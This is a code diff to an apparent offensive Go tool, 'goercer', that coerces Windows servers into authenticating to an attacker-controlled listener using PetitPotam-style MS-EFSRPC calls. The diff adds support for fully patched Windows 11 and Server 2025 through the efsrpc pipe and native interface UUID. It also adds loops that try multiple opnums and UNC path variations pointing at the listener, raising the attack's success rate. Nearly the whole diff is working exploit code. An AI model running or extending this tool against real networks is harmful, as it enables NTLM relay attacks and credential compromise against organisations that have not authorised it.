@@ -146,6 +146,7 @@ func main() {
 	cli.Align = true
 	cli.Banner = "goercer [OPTIONS]"
 	cli.Info("Coerces Windows servers to authenticate to an attacker-controlled listener")
+	cli.Info("Windows 11 Support: Use --pipe efsrpc for fully patched Windows 11/Server 2025")
 	cli.Authors = []string{"ineffectivecoder"}
 
 	// Define flags
@@ -156,7 +157,7 @@ func main() {
 	cli.Flag(&password, "p", "password", "", "Password (prompted if not provided)")
 	cli.Flag(&hash, "H", "hash", "", "NTLM hash (32 hex characters)")
 	cli.Flag(&method, "m", "method", "petitpotam", "Coercion method: petitpotam, spoolsample, shadowcoerce, dfscoerce")
-	cli.Flag(&pipe, "pipe", "lsarpc", "Named pipe (petitpotam only): lsarpc, efsr, samr, netlogon, lsass")
+	cli.Flag(&pipe, "pipe", "lsarpc", "Named pipe (petitpotam only): efsrpc (Win11/Server2025 - 1 callback), lsarpc (older systems - 3 callbacks), samr, netlogon, lsass")
 	cli.Flag(&proxyURL, "proxy", "", "SOCKS5 proxy URL (e.g., socks5://127.0.0.1:1080)")
 	cli.Flag(&verbose, "v", "verbose", false, "Enable verbose/debug output")
 
@@ -195,9 +196,9 @@ func main() {
 		os.Exit(1)
 	}
 
-	// Validate pipe name (case-insensitive)
+	// Validate pipe name (case-insensitive) and map to actual Windows pipe names
 	pipe = strings.ToLower(pipe)
-	validPipes := []string{"lsarpc", "efsr", "samr", "netlogon", "lsass"}
+	validPipes := []string{"lsarpc", "efsr", "efsrpc", "samr", "netlogon", "lsass"}
 	pipeValid := false
 	for _, vp := range validPipes {
 		if pipe == vp {
@@ -207,9 +208,20 @@ func main() {
 	}
 	if !pipeValid {
 		fmt.Printf("[!] Error: Invalid pipe name '%s'\n", pipe)
-		fmt.Println("[!] Valid pipes: lsarpc, efsr, samr, netlogon, lsass")
+		fmt.Println("[!] Valid pipes: efsrpc (Win11), lsarpc, efsr, samr, netlogon, lsass")
 		os.Exit(1)
 	}
+
+	// Map short pipe names to actual Windows pipe names
+	pipeMap := map[string]string{
+		"lsarpc":   "lsarpc",
+		"efsr":     "efsrpc", // Short name maps to full pipe name
+		"efsrpc":   "efsrpc",
+		"samr":     "samr",
+		"netlogon": "netlogon",
+		"lsass":    "lsass",
+	}
+	pipe = pipeMap[pipe]
 
 	// Warn if pipe is specified but method doesn't use it
 	if pipe != "lsarpc" && method != "petitpotam" {
@@ -393,16 +405,28 @@ func main() {
 func executePetitPotam(session *smb.Connection, share string, auth *NTLMAuth, listenerIP string, pipeName string) error {
 	fmt.Printf("[*] Using PetitPotam coercion technique via \\pipe\\%s\n", pipeName)
 
+	// Select the correct UUID based on the pipe being used
+	// Different pipes expose MS-EFSR on different interface UUIDs
+	var uuid string
+	switch pipeName {
+	case "efsrpc":
+		// Native EFSR interface UUID (MS-EFSR)
+		uuid = "df1941c5-fe89-4e79-bf10-463657acf44d"
+	default:
+		// For lsarpc, samr, netlogon, lsass - use alternate UUID
+		uuid = "c681d488-d850-11d0-8c52-00c04fd90f7e"
+	}
+
 	// Define PetitPotam method parameters
 	// Try all known MS-EFSRPC opnums that can trigger coercion
 	method := CoercionMethod{
 		Name:         "PetitPotam",
 		PipeName:     pipeName,
-		UUID:         "c681d488-d850-11d0-8c52-00c04fd90f7e",
+		UUID:         uuid,
 		MajorVersion: 1,
 		MinorVersion: 0,
 		Opnums: []uint16{
-			0,  // EfsRpcOpenFileRaw (often patched)
+			0,  // EfsRpcOpenFileRaw - Works on Win11 with efsrpc pipe
 			4,  // EfsRpcEncryptFileSrv
 			5,  // EfsRpcDecryptFileSrv
 			6,  // EfsRpcQueryUsersOnFile
@@ -448,6 +472,14 @@ func executePetitPotam(session *smb.Connection, share string, auth *NTLMAuth, li
 		12: "EfsRpcFileKeyInfo",
 	}
 
+	// Try multiple path variations like Coercer does to maximize success rate
+	// Different Windows versions respond to different path formats
+	pathVariations := []string{
+		"\\\\" + listenerIP + "\\test\\file.txt\x00", // Path with filename
+		"\\\\" + listenerIP + "\\test\\\x00",         // Path with trailing backslash
+		"\\\\" + listenerIP + "\\test\x00",           // Path without trailing backslash
+	}
+
 	var lastErr error
 	successfulOpnum := -1
 	for _, opnum := range method.Opnums {
@@ -457,28 +489,45 @@ func executePetitPotam(session *smb.Connection, share string, auth *NTLMAuth, li
 		}
 		fmt.Printf("[-] Trying %s opnum %d (%s)...\n", method.Name, opnum, funcName)
 
-		stub := method.CreateStub(listenerIP, opnum)
-		err = sendAuthenticatedRequest(pipe, auth, opnum, stub)
+		// Try all path variations for this opnum
+		for pathIdx, testPath := range pathVariations {
+			if verbose {
+				fmt.Printf("[DEBUG] Path variation %d/%d\n", pathIdx+1, len(pathVariations))
+			}
 
-		if err != nil {
-			if err.Error() == "got fault 0x5" {
-				fmt.Printf("[-] Opnum %d (%s) returned ACCESS_DENIED (probably patched)\n", opnum, funcName)
-			} else if err.Error() == "got ERROR_BAD_NETPATH (0x6f7) - attack likely worked" {
-				fmt.Printf("[+] Opnum %d (%s) got ERROR_BAD_NETPATH - coercion successful!\n", opnum, funcName)
-				successfulOpnum = int(opnum)
-			}
-			lastErr = err
-			// Continue to next opnum regardless
-		} else {
-			// Opnum 0 (EfsRpcOpenFileRaw) often returns success when patched
-			// Patched versions return success without actually doing UNC access
-			if opnum == 0 {
-				fmt.Printf("[!] Opnum 0 (%s) returned success (likely PATCHED - may not trigger callback)\n", funcName)
+			stub := createEfsRpcStub(testPath, uint16(opnum))
+			err = sendAuthenticatedRequest(pipe, auth, opnum, stub)
+
+			if err != nil {
+				if err.Error() == "got fault 0x5" {
+					if verbose {
+						fmt.Printf("[-] Path variation %d: ACCESS_DENIED\n", pathIdx+1)
+					}
+				} else if err.Error() == "got ERROR_BAD_NETPATH (0x6f7) - attack likely worked" {
+					fmt.Printf("[+] Opnum %d (%s) path variation %d got ERROR_BAD_NETPATH - coercion successful!\n", opnum, funcName, pathIdx+1)
+					successfulOpnum = int(opnum)
+					break // Success - no need to try other paths for this opnum
+				}
+				lastErr = err
 			} else {
-				fmt.Printf("[+] Opnum %d (%s) completed successfully\n", opnum, funcName)
+				// Opnum 0 (EfsRpcOpenFileRaw) often returns success when patched
+				if opnum == 0 {
+					if verbose {
+						fmt.Printf("[!] Opnum 0 path variation %d returned success (may be patched)\n", pathIdx+1)
+					}
+				} else {
+					fmt.Printf("[+] Opnum %d (%s) path variation %d completed successfully\n", opnum, funcName, pathIdx+1)
+				}
+				successfulOpnum = int(opnum)
+				break // Success - no need to try other paths
 			}
-			successfulOpnum = int(opnum)
-			lastErr = nil
+		}
+
+		if successfulOpnum == int(opnum) {
+			// This opnum succeeded with one of the path variations
+			if opnum != 0 {
+				break // Found working opnum, stop trying others
+			}
 		}
 	}
 
@@ -2013,10 +2062,7 @@ func createNTLMSignature(auth *NTLMAuth, message []byte) []byte {
 // - Opnum 6 (EfsRpcQueryUsersOnFile): FileName only
 // - Opnum 7 (EfsRpcQueryRecoveryAgents): FileName only
 // - Opnum 12 (EfsRpcFileKeyInfo): FileName + infoClass
-func createEfsRpcStub(listenerIP string, opnum uint16) []byte {
-	// Build UNC path with null terminator (required by MS-EFSRPC)
-	uncPath := "\\\\" + listenerIP + "\\test\\Settings.ini\x00"
-
+func createEfsRpcStub(uncPath string, opnum uint16) []byte {
 	var buf bytes.Buffer
 
 	// Convert to UTF-16LE
